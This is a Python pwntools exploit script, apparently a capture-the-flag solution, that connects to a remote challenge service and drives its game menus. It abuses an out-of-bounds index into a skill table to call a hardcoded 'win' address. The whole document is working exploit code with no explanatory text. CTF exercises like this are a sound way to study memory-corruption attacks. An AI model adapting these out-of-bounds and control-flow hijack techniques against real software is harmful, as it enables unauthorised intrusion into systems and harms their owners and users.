###OOB

from pwn import *

###Util
def play(level,mode='play'):
    mes = r.recvuntil(('use : ','(y/n)? : '))
    print(mes[-10:])
    if p8(mes[-4])==b'?':
        level+=1
        if level<=2:
            r.sendline('y')
            r.sendlineafter('equip: ',p64(win))
        else:
            r.sendline('y')
            r.sendlineafter('(3 to exit): ','1')
            r.sendlineafter('(0: Heal, 1: Attack): ',str((equip_name-skill_table)//8))
            r.sendlineafter('(3 to exit): ','3')
    else:
        r.sendline('1')
        r.sendlineafter(' : ','0')
    return level

###Addr
win = 0x401372
skill_table = 0x6046e0
equip_name = 0x604358

###Exploit
r = remote('svc.pwnable.xyz',30020)
level = 0
while level<=2:
    level = play(level)
play(0)
print(r.recvline())
#r.interactive()
